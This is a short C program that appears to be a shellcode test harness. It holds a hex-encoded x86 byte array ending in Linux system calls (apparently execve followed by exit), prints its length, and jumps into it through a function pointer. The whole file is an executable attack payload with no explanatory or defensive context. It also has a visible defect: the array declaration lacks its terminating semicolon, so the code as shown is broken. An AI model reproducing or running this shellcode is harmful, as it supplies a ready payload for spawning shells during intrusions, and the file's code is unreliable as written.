#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x50\xb8\x5e\x5e\xe6\xd0\xd1\xc8\x50\x05\x00\x33\xf6\x05\x50\x89\xdc\x89\xc8\x89\xd0\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}